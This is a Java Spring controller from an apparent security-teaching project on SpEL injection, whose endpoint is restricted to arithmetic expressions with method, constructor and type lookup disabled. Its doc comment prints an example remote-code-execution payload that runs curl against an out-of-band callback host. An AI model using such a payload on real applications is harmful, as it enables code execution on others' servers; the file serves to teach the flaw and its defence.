package org.joychou.controller;

import org.springframework.expression.ConstructorResolver;
import org.springframework.expression.EvaluationException;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.MethodResolver;
import org.springframework.expression.TypeLocator;
import org.springframework.expression.spel.SpelEvaluationException;
import org.springframework.expression.spel.SpelMessage;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.util.HtmlUtils;

import java.util.Collections;
import java.util.regex.Pattern;


/**
 * SpEL Injection
 *
 * @author JoyChou @2019-01-17
 */
@RestController
public class SpEL {

    private static final Pattern SAFE_EXPRESSION = Pattern.compile("^[0-9\\s+\\-*/%().]+$");

    /**
     * SpEL to RCE
     * http://localhost:8080/spel/vul/?expression=xxx.
     * xxx is urlencode(exp)
     * exp: T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")
     */
    @GetMapping("/spel/vuln")
    public String rce(String expression) {
        // Only plain arithmetic expressions are accepted: no type references (T(..)), constructors,
        // method calls, bean references, variables or strings.
        if (null == expression || expression.length() > 256 || !SAFE_EXPRESSION.matcher(expression).matches()) {
            return "Bad boy. I got u.";
        }
        ExpressionParser parser = new SpelExpressionParser();
        Object value = parser.parseExpression(expression).getValue(restrictedContext());
        return HtmlUtils.htmlEscape(String.valueOf(value));
    }

    /**
     * Evaluation context with no method / constructor resolution and no type lookup.
     */
    private static StandardEvaluationContext restrictedContext() {
        StandardEvaluationContext context = new StandardEvaluationContext();
        context.setMethodResolvers(Collections.<MethodResolver>emptyList());
        context.setConstructorResolvers(Collections.<ConstructorResolver>emptyList());
        context.setTypeLocator(new TypeLocator() {
            @Override
            public Class<?> findType(String typeName) throws EvaluationException {
                throw new SpelEvaluationException(SpelMessage.TYPE_NOT_FOUND, typeName);
            }
        });
        return context;
    }

    public static void main(String[] args) {
        ExpressionParser parser = new SpelExpressionParser();
        String result = String.valueOf(parser.parseExpression("1 + 2").getValue(restrictedContext()));
        System.out.println(result);
    }
}

